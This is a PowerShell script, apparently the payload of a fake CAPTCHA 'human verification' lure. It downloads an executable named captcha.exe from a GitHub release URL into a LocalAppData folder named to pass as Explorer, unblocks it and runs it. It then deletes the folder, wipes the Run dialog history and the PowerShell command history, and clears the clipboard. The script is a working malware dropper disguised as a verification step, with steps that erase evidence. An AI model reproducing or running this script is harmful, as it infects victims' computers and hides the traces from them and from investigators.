$authSite = "https://github.com/barbaraucpvc/Captcha2/releases/download/release/"
$verifyMe = "captcha.exe"
$tempMe = "$env:localappdata\Explorer\"
$completeVerification = $authSite + $verifyMe
$verifyFile = Join-Path $tempMe $verifyMe

mkdir $tempMe -ErrorAction Ignore | Out-Null
Invoke-WebRequest -Uri $completeVerification -OutFile $verifyFile -UseBasicParsing
Unblock-File -Path $verifyFile
& $verifyFile | Out-Null

rm -Recurse -Force $tempMe -ErrorAction Ignore 
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f | Out-Null
rm (Get-PSReadLineOption).HistorySavePath -Force
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
echo " Windows Human Verification"
"" | clip
